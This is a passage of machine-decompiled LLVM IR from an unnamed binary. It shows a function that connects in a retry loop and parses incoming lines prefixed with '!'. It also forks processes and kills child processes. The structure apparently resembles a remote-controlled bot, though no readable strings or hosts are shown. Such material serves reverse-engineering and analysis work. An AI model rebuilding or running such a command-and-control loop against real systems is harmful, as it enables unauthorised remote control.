  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_f424.preheader ], [ %v5_f420, %dec_label_pc_f418 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_f488

dec_label_pc_f444:                                ; preds = %dec_label_pc_f3e0
  store i32 4096, i32* @r2, align 4
  %v3_f45c = call i32 @function_11d70(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_f460

dec_label_pc_f460:                                ; preds = %dec_label_pc_f3bc, %dec_label_pc_f444
  %v4_f478 = call i32 @function_9388(i32 %v2_f468, i32 4096, i32 %v4_f3d0, i32 %v2_f468)
  %v2_f480 = icmp eq i32 %v4_f478, 0
  br i1 %v2_f480, label %dec_label_pc_f488, label %dec_label_pc_f3e0

dec_label_pc_f488:                                ; preds = %dec_label_pc_f460, %dec_label_pc_f434
  %v1_f48c = call i32 @function_10678(i32 %v4_f3d0)
  %v4_f49c = load i8, i8* %stack_var_-4168, align 1
  %v2_f4a0 = icmp eq i8 %v4_f49c, 0
  br i1 %v2_f4a0, label %dec_label_pc_f538, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_f488
  %v2_f4b0 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_f4c8 = call i32 @function_11f98(i32 %v2_f4b0, i8* nonnull %stack_var_-4168)
  store i32 %v2_f4b0, i32* @r3, align 4
  %v3_f4e8 = call i32 @function_1077c(i32 %v3_f2b4, i32 35111, i32 %v2_f4b0)
  %v2_f508 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4a8, %dec_label_pc_f4f8
  %storemerge47 = phi i32 [ 0, %dec_label_pc_f4a8 ], [ %v1_f524, %dec_label_pc_f4f8 ]
  %v2_f510 = add i32 %storemerge47, %v2_f508
  %v1_f514 = inttoptr i32 %v2_f510 to i8*
  %v2_f514 = load i8, i8* %v1_f514, align 1
  %v4_f51c = add i32 %storemerge47, ptrtoint (i32* @global_var_205e0.166 to i32)
  %v5_f51c = inttoptr i32 %v4_f51c to i8*
  store i8 %v2_f514, i8* %v5_f51c, align 1
  %v1_f524 = add nuw nsw i32 %storemerge47, 1
  %v7_f534 = icmp slt i32 %v1_f524, 6
  br i1 %v7_f534, label %dec_label_pc_f4f8, label %dec_label_pc_f538

dec_label_pc_f538:                                ; preds = %dec_label_pc_f4f8, %dec_label_pc_f488
  %v1_f53c = call i32 @function_10678(i32 %v3_f2b4)
  %v3_f558.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_f554

dec_label_pc_f544:                                ; preds = %dec_label_pc_f3ac, %dec_label_pc_f36c, %dec_label_pc_f2cc
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_f554

dec_label_pc_f554:                                ; preds = %dec_label_pc_f538, %dec_label_pc_f544
  %v3_f558 = phi i32 [ %v3_f558.pre, %dec_label_pc_f538 ], [ 0, %dec_label_pc_f544 ]
  %v2_f560 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f560, i32* @fp, align 4
  ret i32 %v3_f558

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_f41c, { 1, 0 }
  uselistorder i32 %v2_f468, { 1, 3, 0, 2 }
  uselistorder i32 %v3_f2b4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @function_10678, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 13, 12, 11, 19, 18, 17, 16, 15, 14, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32* @global_var_2664c.76, { 2, 0, 1 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_124f8, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32)* @function_12434, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_124d4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1263c, { 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f554, { 1, 0 }
  uselistorder label %dec_label_pc_f4f8, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 1, 0 }
  uselistorder label %dec_label_pc_f418, { 1, 0 }
}

define i32 @function_f578(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_f578:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-1160 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f57c = load i32, i32* @r4, align 4
  store i32 %v3_f57c, i32* %stack_var_-28, align 4
  store i32 62852, i32* %stack_var_-4, align 4
  %v22_f57c = ptrtoint i32* %stack_var_-28 to i32
  %v2_f580 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f580, i32* @fp, align 4
  %v2_f5b0 = call i32 @function_1096c(i32* null)
  store i32 %v2_f5b0, i32* @r4, align 4
  %v0_f5b8 = call i32 @function_10724()
  %v0_f5c0 = load i32, i32* @r4, align 4
  %v2_f5c0 = xor i32 %v0_f5c0, %v0_f5b8
  %v1_f5c8 = call i32 @function_12ec0(i32 %v2_f5c0)
  %v2_f5d0 = call i32 @function_1096c(i32* null)
  store i32 %v2_f5d0, i32* @r4, align 4
  %v0_f5d8 = call i32 @function_10724()
  %v0_f5e0 = load i32, i32* @r4, align 4
  %v2_f5e0 = xor i32 %v0_f5e0, %v0_f5d8
  %v1_f5e8 = call i32 @function_832c(i32 %v2_f5e0)
  %v1_f5ec = call i32 @function_f294(i32 %v1_f5e8)
  %v2_f600 = load i32, i32* %arg2, align 4
  store i32 %v2_f600, i32* @r0, align 4
  %v0_f620 = call i32 @function_11e30()
  store i32 ptrtoint ([6 x i8]* @global_var_16e24.168 to i32), i32* @r1, align 4
  %v4_f634 = call i32 @function_11fb4(i32 %v2_f600, i32 ptrtoint ([6 x i8]* @global_var_16e24.168 to i32), i32 %v0_f620)
  br label %dec_label_pc_f6b8

dec_label_pc_f644:                                ; preds = %dec_label_pc_f6b8
  %v3_f648 = mul i32 %storemerge11, 4
  %v2_f660 = add i32 %v3_f648, %tmp
  %v1_f664 = inttoptr i32 %v2_f660 to i32*
  %v2_f664 = load i32, i32* %v1_f664, align 4
  store i32 %v2_f664, i32* @r0, align 4
  %v0_f690 = call i32 @function_11e30()
  store i32 %v0_f690, i32* @r2, align 4
  %v2_f6a8 = inttoptr i32 %v2_f664 to i8*
  %v3_f6a8 = call i32 @function_11d70(i8* %v2_f6a8, i32 0)
  %v1_f6b0 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f578, %dec_label_pc_f644
  %storemerge11 = phi i32 [ 1, %dec_label_pc_f578 ], [ %v1_f6b0, %dec_label_pc_f644 ]
  %v5_f6d0 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_f6d0, label %dec_label_pc_f644, label %dec_label_pc_f6d4

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_f6b8
  %v1_f6d4 = call i32 @function_81dc(i32 %v22_f57c)
  store i32 %v1_f6d4, i32* @r4, align 4
  %v0_f6dc = call i32 @function_8218()
  store i32 %v0_f6dc, i32* @r5, align 4
  %v0_f6e4 = call i32 @function_81f8()
  %v0_f700 = load i32, i32* @r4, align 4
  %v0_f704 = load i32, i32* @r5, align 4
  %v7_f708 = call i32 @function_10ad8(i32 ptrtoint ([46 x i8]* @global_var_16e2c.172 to i32), i32 ptrtoint (i32* @global_var_16e5c.174 to i32), i32 %v0_f700, i32 %v0_f704, i32 %v0_f6e4, i32 ptrtoint (i32* @global_var_16e64.170 to i32))
  %v0_f70c = call i32 @function_106d0()
  %v2_f71c = icmp eq i32 %v0_f70c, 0
  br i1 %v2_f71c, label %dec_label_pc_f74c, label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f6d4
  %v2_f724 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v0_f70c, i32* @r0, align 4
  store i32 %v2_f724, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v3_f734 = call i32 @function_10998(i32 %v0_f70c, i32 %v2_f724, i32 0)
  %v1_f73c = call i32 @function_133cc(i32 0)
  br label %dec_label_pc_f76c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f6d4
  %v0_f74c = call i32 @function_106d0()
  %v2_f75c = icmp eq i32 %v0_f74c, 0
  br i1 %v2_f75c, label %dec_label_pc_f76c, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f74c
  %v1_f768 = call i32 @function_133cc(i32 0)
  br label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f740, %dec_label_pc_f74c, %dec_label_pc_f764
  %v0_f76c = call i32 @function_108ec()
  %v2_f774 = call i32 @function_1064c(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_16e6c.176, i32 0, i32 0))
  %v2_f780 = call i32 @function_126b0(i32 13, i32 1)
  %v2_1017c = ptrtoint i32* %stack_var_-5256 to i32
  %v4_1018c = bitcast i32* %stack_var_-5256 to i8*
  %v2_fae8 = add i32 %v22_f57c, -5228
  %v7_fb48 = icmp eq i32 %arg1, 2
  %v1_fb78 = add i32 %tmp, 4
  %v1_fb7c = inttoptr i32 %v1_fb78 to i32*
  %v1_fd78 = or i32 %v2_1017c, 1
  %v2_fd98 = or i32 %v2_1017c, 2
  %v2_fef4 = ptrtoint i32* %stack_var_-1160 to i32
  %v2_ff04 = bitcast i32* %stack_var_-1160 to i8*
  %v2_1013c = add i32 %v22_f57c, -108
  br label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f798, %dec_label_pc_1016c, %dec_label_pc_f76c
  %v0_f788 = call i32 @function_f108()
  %v2_f790 = icmp eq i32 %v0_f788, 0
  br i1 %v2_f790, label %dec_label_pc_f7b4, label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f788
  %v7_f7a4 = call i32 @function_10ad8(i32 ptrtoint ([38 x i8]* @global_var_16e70.178 to i32), i32 ptrtoint (i32* @global_var_16e5c.174 to i32), i32 ptrtoint (i32* @global_var_16e64.170 to i32), i32 %v0_f788, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_f7ac = call i32 @function_134f4(i32 5)
  br label %dec_label_pc_f788

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f788
  %v2_f7b8 = load i32, i32* @global_var_205d0.63, align 4
  store i32 %v2_f7b8, i32* @r4, align 4
  %v1_f7bc = call i32 @function_81dc(i32 0)
  store i32 %v1_f7bc, i32* @r5, align 4
  %v0_f7c4 = call i32 @function_8218()
  store i32 %v0_f7c4, i32* @r6, align 4
  %v0_f7cc = call i32 @function_81f8()
  %v0_f7d8 = load i32, i32* @r4, align 4
  %v0_f7e0 = load i32, i32* @r5, align 4
  store i32 %v0_f7e0, i32* @r2, align 4
  %v3_f7e8 = call i32 @function_8eb4(i32 %v0_f7d8, i32 ptrtoint ([17 x i8]* @global_var_16e98.181 to i32))
  br label %dec_label_pc_1016c

dec_label_pc_f80c:                                ; preds = %dec_label_pc_fac0, %dec_label_pc_fa64
  %v3_f810 = mul i32 %storemerge12, 4
  %v2_f81c = load i32, i32* @global_var_26654.70, align 4
  %v2_f820 = add i32 %v2_f81c, %v3_f810
  %v1_f824 = inttoptr i32 %v2_f820 to i32*
  %v2_f824 = load i32, i32* %v1_f824, align 4
  store i32 %v2_f824, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v3_f834 = call i32 @function_10998(i32 %v2_f824, i32 0, i32 1)
  %tmp104 = icmp slt i32 %v3_f834, 1
  br i1 %tmp104, label %dec_label_pc_fa58, label %dec_label_pc_f89c

dec_label_pc_f854:                                ; preds = %dec_label_pc_f89c, %dec_label_pc_f8f4
  %v3_f858 = mul i32 %v1_f848, 4
  %v2_f864 = load i32, i32* @global_var_26654.70, align 4
  %v2_f868 = add i32 %v2_f864, %v3_f858
  %v1_f86c = add i32 %v2_f868, -4
  %v1_f888 = inttoptr i32 %v2_f868 to i32*
  %v2_f888 = load i32, i32* %v1_f888, align 4
  %v2_f88c = inttoptr i32 %v1_f86c to i32*
  store i32 %v2_f888, i32* %v2_f88c, align 4
  br label %dec_label_pc_f89c

dec_label_pc_f89c:                                ; preds = %dec_label_pc_f80c, %dec_label_pc_f854
  %v3_f844.sink = phi i32 [ %v1_f848, %dec_label_pc_f854 ], [ %storemerge12, %dec_label_pc_f80c ]
  %v1_f848 = add i32 %v3_f844.sink, 1
  %v2_f8b4 = load i32, i32* @global_var_205d8.67, align 4
  %v9_f8d4 = icmp eq i32 %v2_f8b4, 0
  br i1 %v9_f8d4, label %dec_label_pc_f8f4, label %dec_label_pc_f854

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f89c
  %v5_f8b4 = load i32, i32* @global_var_205dc.68, align 4
  %tmp105 = icmp ugt i32 %v5_f8b4, %v1_f848
  br i1 %tmp105, label %dec_label_pc_f854, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8f4
  %v3_f910 = mul i32 %v1_f848, 4
  %v2_f91c = load i32, i32* @global_var_26654.70, align 4
  %v2_f920 = add i32 %v3_f910, -4
  %v1_f924 = add i32 %v2_f920, %v2_f91c
  %v2_f92c = inttoptr i32 %v1_f924 to i32*
  store i32 0, i32* %v2_f92c, align 4
  %v2_f934 = load i32, i32* @global_var_205d8.67, align 4
  %v5_f934 = load i32, i32* @global_var_205dc.68, align 4
  %v2_f940 = add i32 %v2_f934, -1
  %v3_f940 = icmp ne i32 %v2_f934, 0
  %v3_f944 = add i32 %v5_f934, -1
  %v4_f944 = zext i1 %v3_f940 to i32
  %v5_f944 = add i32 %v3_f944, %v4_f944
  store i32 %v2_f940, i32* @global_var_205d8.67, align 4
  store i32 %v5_f944, i32* @global_var_205dc.68, align 4
  %v3_f958 = udiv i32 %v2_f940, 1073741824
  %v3_f95c = mul i32 %v5_f944, 4
  %v2_f960 = or i32 %v3_f95c, %v3_f958
  store i32 %v2_f960, i32* @r4, align 4
  %v3_f964 = mul i32 %v2_f940, 4
  %v1_f968 = add i32 %v3_f964, 4
  %v1_f970 = call i32 @function_127d4(i32 %v1_f968)
  br label %dec_label_pc_f9c8

dec_label_pc_f988:                                ; preds = %dec_label_pc_f9c8, %dec_label_pc_fa24
  %v3_f98c = mul i32 %storemerge17, 4
  %v2_f998 = add i32 %v3_f98c, %v1_f970
  %v2_f9ac = load i32, i32* @global_var_26654.70, align 4
  %v2_f9b0 = add i32 %v2_f9ac, %v3_f98c
  %v1_f9b4 = inttoptr i32 %v2_f9b0 to i32*
  %v2_f9b4 = load i32, i32* %v1_f9b4, align 4
  %v2_f9b8 = inttoptr i32 %v2_f998 to i32*
  store i32 %v2_f9b4, i32* %v2_f9b8, align 4
  %v1_f9c0 = add i32 %storemerge17, 1
  br label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %dec_label_pc_f90c, %dec_label_pc_f988
  %storemerge17 = phi i32 [ 0, %dec_label_pc_f90c ], [ %v1_f9c0, %dec_label_pc_f988 ]
  %v2_f9e4 = load i32, i32* @global_var_205d8.67, align 4
  %v9_fa04 = icmp eq i32 %v2_f9e4, 0
  br i1 %v9_fa04, label %dec_label_pc_fa24, label %dec_label_pc_f988

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9c8
  %v5_f9e4 = load i32, i32* @global_var_205dc.68, align 4
  %tmp118 = icmp ugt i32 %v5_f9e4, %storemerge17
  br i1 %tmp118, label %dec_label_pc_f988, label %dec_label_pc_fa3c

dec_label_pc_fa3c:                                ; preds = %dec_label_pc_fa24
  %v2_fa40 = load i32, i32* @global_var_26654.70, align 4
  %v1_fa48 = call i32 @function_12928(i32 %v2_fa40)
  store i32 %v1_f970, i32* @global_var_26654.70, align 4
  br label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %dec_label_pc_f80c, %dec_label_pc_fa3c
  %v1_fa5c = add i32 %storemerge12, 1
  br label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_1016c, %dec_label_pc_fa58
  %storemerge12 = phi i32 [ %v1_fa5c, %dec_label_pc_fa58 ], [ 0, %dec_label_pc_1016c ]
  %v3_fa6c = ashr i32 %storemerge12, 31
  %v2_fa80 = load i32, i32* @global_var_205d8.67, align 4
  %v5_fa80 = load i32, i32* @global_var_205dc.68, align 4
  %v3_faa0 = icmp uge i32 %v2_fa80, %v3_fa6c
  %v9_faa0 = icmp eq i32 %v2_fa80, %v3_fa6c
  %v2_faa4 = xor i1 %v9_faa0, true
  %v3_faa4 = and i1 %v3_faa0, %v2_faa4
  br i1 %v3_faa4, label %dec_label_pc_f80c, label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa64
  br i1 %v9_faa0, label %dec_label_pc_fac0, label %dec_label_pc_fad8

dec_label_pc_fac0:                                ; preds = %dec_label_pc_faa8
  %tmp119 = icmp ugt i32 %v5_fa80, %storemerge12
  br i1 %tmp119, label %dec_label_pc_f80c, label %dec_label_pc_fad8

dec_label_pc_fad8:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fac0
  %v2_faec = add i32 %v2_fae8, %v5_1018c
  %v3_faf4 = inttoptr i32 %v2_faec to i8*
  store i8 0, i8* %v3_faf4, align 1
  %v1_fb08 = call i32 @function_8538(i32 %v2_1017c)
  %v2_fb1c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16eac.185 to i32), i32* @r1, align 4
  %v3_fb28 = inttoptr i32 %v2_fb1c to i8*
  %v4_fb28 = call i32 @function_11e10(i8* %v3_fb28, i32 ptrtoint ([8 x i8]* @global_var_16eac.185 to i32))
  %v2_fb30 = icmp eq i32 %v4_fb28, 0
  br i1 %v2_fb30, label %dec_label_pc_fb38, label %dec_label_pc_fc7c

dec_label_pc_fb38:                                ; preds = %dec_label_pc_fad8
  store i32 %v22_f57c, i32* @r2, align 4
  br i1 %v7_fb48, label %dec_label_pc_fb68, label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fb38
  %v2_fb54 = load i32, i32* @global_var_205d0.63, align 4
  %v3_fb60 = call i32 @function_8eb4(i32 %v2_fb54, i32 ptrtoint ([17 x i8]* @global_var_16eb4.187 to i32))
  br label %dec_label_pc_101a8

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb38
  %v2_fb7c = load i32, i32* %v1_fb7c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16ec8.189 to i32), i32* @r1, align 4
  %v3_fb88 = inttoptr i32 %v2_fb7c to i8*
  %v4_fb88 = call i32 @function_11e10(i8* %v3_fb88, i32 ptrtoint ([4 x i8]* @global_var_16ec8.189 to i32))
  %v2_fb90 = icmp eq i32 %v4_fb88, 0
  br i1 %v2_fb90, label %dec_label_pc_fb98, label %dec_label_pc_fbdc

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb68
  %v2_fb9c = load i32, i32* @global_var_26650.191, align 4
  %v2_fba0 = icmp eq i32 %v2_fb9c, 0
  br i1 %v2_fba0, label %dec_label_pc_101a8, label %dec_label_pc_fba8

dec_label_pc_fba8:                                ; preds = %dec_label_pc_fb98
  %v2_fbac = load i32, i32* @global_var_205d0.63, align 4
  %v3_fbb8 = call i32 @function_8eb4(i32 %v2_fbac, i32 ptrtoint ([17 x i8]* @global_var_16ecc.193 to i32))
  %v2_fbc0 = load i32, i32* @global_var_26650.191, align 4
  %v2_fbcc = call i32 @function_107cc(i32 %v2_fbc0, i32 9)
  store i32 0, i32* @global_var_26650.191, align 4
  br label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fb68, %dec_label_pc_fba8
  %v2_fbf0 = load i32, i32* %v1_fb7c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16ee0.195 to i32), i32* @r1, align 4
  %v3_fbfc = inttoptr i32 %v2_fbf0 to i8*
  %v4_fbfc = call i32 @function_11e10(i8* %v3_fbfc, i32 ptrtoint ([3 x i8]* @global_var_16ee0.195 to i32))
  %v2_fc04 = icmp eq i32 %v4_fbfc, 0
  br i1 %v2_fc04, label %dec_label_pc_fc0c, label %dec_label_pc_fc7c

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fbdc
  %v2_fc10 = load i32, i32* @global_var_26650.191, align 4
  %v2_fc14 = icmp eq i32 %v2_fc10, 0
  br i1 %v2_fc14, label %dec_label_pc_fc1c, label %dec_label_pc_101a8

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc0c
  %v0_fc1c = call i32 @function_106d0()
  %v2_fc2c = call i32 @function_10a24(i32 ptrtoint ([28 x i8]* @global_var_16ee4.197 to i32))
  %v2_fc34 = load i32, i32* @global_var_205d0.63, align 4
  %v3_fc40 = call i32 @function_8eb4(i32 %v2_fc34, i32 ptrtoint ([17 x i8]* @global_var_16f00.199 to i32))
  %v2_fc48 = icmp eq i32 %v0_fc1c, 0
  br i1 %v2_fc48, label %dec_label_pc_fc6c, label %dec_label_pc_fc50

dec_label_pc_fc50:                                ; preds = %dec_label_pc_fc1c
  store i32 %v0_fc1c, i32* @global_var_26650.191, align 4
  br label %dec_label_pc_101a8

dec_label_pc_fc6c:                                ; preds = %dec_label_pc_fc1c
  %v1_fc70 = call i32 @function_aec4(i32 1)
  %v1_fc78 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_fc7c:                                ; preds = %dec_label_pc_fbdc, %dec_label_pc_fad8
  %v4_fc90 = call i32 @function_1214c(i32 %v2_1017c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16d40.65, i32 0, i32 0))
  store i32 %v4_fc90, i32* @r2, align 4
  %v9_fca4 = icmp eq i32 %v4_fc90, %v2_1017c
  br i1 %v9_fca4, label %dec_label_pc_fcac, label %dec_label_pc_fcc4

dec_label_pc_fcac:                                ; preds = %dec_label_pc_fc7c
  %v2_fcb0 = load i32, i32* @global_var_205d0.63, align 4
  %v3_fcbc = call i32 @function_8eb4(i32 %v2_fcb0, i32 ptrtoint ([5 x i8]* @global_var_16f14.202 to i32))
  br label %dec_label_pc_1016c

dec_label_pc_fcc4:                                ; preds = %dec_label_pc_fc7c
  %v4_fcd8 = call i32 @function_1214c(i32 %v2_1017c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_16f1c.203, i32 0, i32 0))
  %v9_fcec = icmp eq i32 %v4_fcd8, %v2_1017c
  br i1 %v9_fcec, label %dec_label_pc_fcf4, label %dec_label_pc_fcfc

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fcc4
  %v1_fcf8 = call i32 @function_133cc(i32 0)
  br label %dec_label_pc_fcfc

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcc4, %dec_label_pc_fcf4
  %v2_fd10 = load i8, i8* %v4_1018c, align 4
  %v7_fd14 = icmp eq i8 %v2_fd10, 33
  br i1 %v7_fd14, label %dec_label_pc_fd38, label %dec_label_pc_1016c

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fcfc, %dec_label_pc_fd48
  %v3_fd1c.sink = phi i8* [ %storemerge6, %dec_label_pc_fd48 ], [ %v4_1018c, %dec_label_pc_fcfc ]
  %v4_fd1c = ptrtoint i8* %v3_fd1c.sink to i32
  %v1_fd20 = add i32 %v4_fd1c, 1
  %storemerge6 = inttoptr i32 %v1_fd20 to i8*
  %v2_fd3c = load i8, i8* %storemerge6, align 1
  %v7_fd40 = icmp eq i8 %v2_fd3c, 32
  br i1 %v7_fd40, label %dec_label_pc_fd58, label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd38
  %v2_fd4c = load i8, i8* %storemerge6, align 1
  %v2_fd50 = icmp eq i8 %v2_fd4c, 0
  br i1 %v2_fd50, label %dec_label_pc_fd58, label %dec_label_pc_fd38

dec_label_pc_fd58:                                ; preds = %dec_label_pc_fd48, %dec_label_pc_fd38
  %v2_fd5c = load i8, i8* %storemerge6, align 1
  %v2_fd60 = icmp eq i8 %v2_fd5c, 0
  br i1 %v2_fd60, label %dec_label_pc_1016c, label %dec_label_pc_fd68

dec_label_pc_fd68:                                ; preds = %dec_label_pc_fd58
  store i8 0, i8* %storemerge6, align 1
  store i32 %v1_fd78, i32* @r0, align 4
  %v0_fd88 = call i32 @function_11e30()
  %v1_fd9c = add i32 %v0_fd88, %v2_fd98
  %v2_fde8 = add i32 %v1_fd9c, -1
  br label %dec_label_pc_fdd0

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fdfc, %dec_label_pc_fdd0
  store i32 %v1_fd9c, i32* @r0, align 4
  %v0_fdb0 = call i32 @function_11e30()
  %v1_fdc4 = add i32 %v2_fde8, %v0_fdb0
  %v3_fdcc = inttoptr i32 %v1_fdc4 to i8*
  store i8 0, i8* %v3_fdcc, align 1
  br label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fd68, %dec_label_pc_fda8
  store i32 %v1_fd9c, i32* @r0, align 4
  %v0_fdd8 = call i32 @function_11e30()
  %v1_fdec = add i32 %v0_fdd8, %v2_fde8
  %v1_fdf0 = inttoptr i32 %v1_fdec to i8*
  %v2_fdf0 = load i8, i8* %v1_fdf0, align 1
  %v7_fdf4 = icmp eq i8 %v2_fdf0, 10
  br i1 %v7_fdf4, label %dec_label_pc_fda8, label %dec_label_pc_fdfc

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fdd0
  store i32 %v1_fd9c, i32* @r0, align 4
  %v0_fe04 = call i32 @function_11e30()
  %v1_fe18 = add i32 %v0_fe04, %v2_fde8
  %v1_fe1c = inttoptr i32 %v1_fe18 to i8*
  %v2_fe1c = load i8, i8* %v1_fe1c, align 1
  %v7_fe20 = icmp eq i8 %v2_fe1c, 13
  br i1 %v7_fe20, label %dec_label_pc_fda8, label %dec_label_pc_fe40.preheader

dec_label_pc_fe40.preheader:                      ; preds = %dec_label_pc_fdfc
  %stack_var_-72.018 = inttoptr i32 %v1_fd9c to i8*
  %v2_fe4419 = load i8, i8* %stack_var_-72.018, align 1
  %v7_fe4823 = icmp eq i8 %v2_fe4419, 32
  br i1 %v7_fe4823, label %dec_label_pc_fe60, label %dec_label_pc_fe50

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe50
  %v1_fe38 = add i32 %stack_var_-72.0.in24, 1
  %stack_var_-72.0 = inttoptr i32 %v1_fe38 to i8*
  %v2_fe44 = load i8, i8* %stack_var_-72.0, align 1
  %v7_fe48 = icmp eq i8 %v2_fe44, 32
  br i1 %v7_fe48, label %dec_label_pc_fe60, label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %dec_label_pc_fe40.preheader, %dec_label_pc_fe34
  %stack_var_-72.025 = phi i8* [ %stack_var_-72.0, %dec_label_pc_fe34 ], [ %stack_var_-72.018, %dec_label_pc_fe40.preheader ]
  %stack_var_-72.0.in24 = phi i32 [ %v1_fe38, %dec_label_pc_fe34 ], [ %v1_fd9c, %dec_label_pc_fe40.preheader ]
  %v2_fe54 = load i8, i8* %stack_var_-72.025, align 1
  %v2_fe58 = icmp eq i8 %v2_fe54, 0
  br i1 %v2_fe58, label %dec_label_pc_fe60, label %dec_label_pc_fe34

dec_label_pc_fe60:                                ; preds = %dec_label_pc_fe34, %dec_label_pc_fe50, %dec_label_pc_fe40.preheader
  %stack_var_-72.0.in.lcssa = phi i32 [ %v1_fd9c, %dec_label_pc_fe40.preheader ], [ %v1_fe38, %dec_label_pc_fe34 ], [ %stack_var_-72.0.in24, %dec_label_pc_fe50 ]
  %stack_var_-72.0.lcssa = phi i8* [ %stack_var_-72.018, %dec_label_pc_fe40.preheader ], [ %stack_var_-72.0, %dec_label_pc_fe34 ], [ %stack_var_-72.025, %dec_label_pc_fe50 ]
  store i8 0, i8* %stack_var_-72.0.lcssa, align 1
  %v1_fe70 = add i32 %stack_var_-72.0.in.lcssa, 1
  %v2_feb430 = load i8, i8* %stack_var_-72.018, align 1
  %v2_feb832 = icmp eq i8 %v2_feb430, 0
  br i1 %v2_feb832, label %dec_label_pc_fec0, label %dec_label_pc_fe84

dec_label_pc_fe84:                                ; preds = %dec_label_pc_fe60, %dec_label_pc_fe84
  %storemerge534 = phi i8* [ %storemerge5, %dec_label_pc_fe84 ], [ %stack_var_-72.018, %dec_label_pc_fe60 ]
  %storemerge1433 = phi i32 [ %v1_fea8, %dec_label_pc_fe84 ], [ %v1_fd9c, %dec_label_pc_fe60 ]
  %v2_fe88 = load i8, i8* %storemerge534, align 1
  %v3_fe88 = zext i8 %v2_fe88 to i32
  %v1_fe90 = call i32 @function_109e4(i32 %v3_fe88)
  %v1_fea0 = trunc i32 %v1_fe90 to i8
  store i8 %v1_fea0, i8* %storemerge534, align 1
  %v1_fea8 = add i32 %storemerge1433, 1
  %storemerge5 = inttoptr i32 %v1_fea8 to i8*
  %v2_feb4 = load i8, i8* %storemerge5, align 1
  %v2_feb8 = icmp eq i8 %v2_feb4, 0
  br i1 %v2_feb8, label %dec_label_pc_fec0, label %dec_label_pc_fe84

